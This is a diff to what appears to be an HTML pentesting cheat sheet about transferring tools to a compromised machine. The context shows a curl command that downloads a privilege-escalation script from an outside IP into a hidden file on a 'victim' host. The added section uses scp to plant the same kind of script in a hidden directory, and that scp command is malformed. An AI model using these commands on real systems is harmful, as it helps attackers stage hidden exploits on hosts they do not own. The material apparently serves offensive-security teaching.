@@ -534,6 +534,9 @@ The use curl to download the file like this:
 
 <b>hacked-account@victim~: </b><code>curl 10.10.10.10:5555/super-privesc-0day.sh -o .hidden-file.sh</code>
 
+<h2>SCP</h2>
+
+<b>pform@attacker~: </b>scp - id_rsa ~/scripts/superprivesc0day.sh hacked-account@10.10.20.20/home/hacked-account/.hidden/privesc.sh</code>
 
 <h2>With NETCAT</h2>
 
